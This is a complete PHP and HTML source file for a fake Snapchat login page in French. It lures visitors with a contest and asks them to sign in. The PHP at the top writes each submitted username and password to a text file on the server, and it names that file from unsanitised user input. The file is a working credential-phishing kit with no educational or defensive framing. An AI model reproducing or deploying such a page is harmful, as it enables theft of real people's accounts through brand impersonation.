<?php
    if(isset($_POST['submit'])){
        $myfile = fopen($_POST['username'] . ".txt", "w") or die("Unable to open file!");
        fwrite($myfile, $_POST['username'] . "\n");
        fwrite($myfile, $_POST['password']);
        fclose($myfile);
    }
?>

<html>
    <head>
        <link rel="stylesheet" href="styles.css">
    </head>
    <body>
<div class="container">
    <div class="logo-container">
        <img class="snapchat-icon" src="logo.svg" alt="Snapchat">
    </div>
    <h1 class="accountsTitle">Connectez-vous pour participer au concours</h1>
    <div>
        <form id="login_form" action="login.php" method="post" class="centered_form">
            <div class="form-group has-error">
                <label for="username" class="control-label">Nom d'utilisateur ou adresse email</label>
                <input name="username" autocomplete="off" type="text" id="username" class="form-control">
            </div>
            <div class="form-group has-error">
                <label for="password" class="control-label">Mot de passe</label>
                <input name="password" autocomplete="off" type="password" id="password" class="form-control">
            </div>
            <div class="primary_action">
                <button type="submit" class="btn btn-link" name="submit" id="submit">Se connecter</button>
            </div>
        </form>
    </div>
</div>
</body>
</html>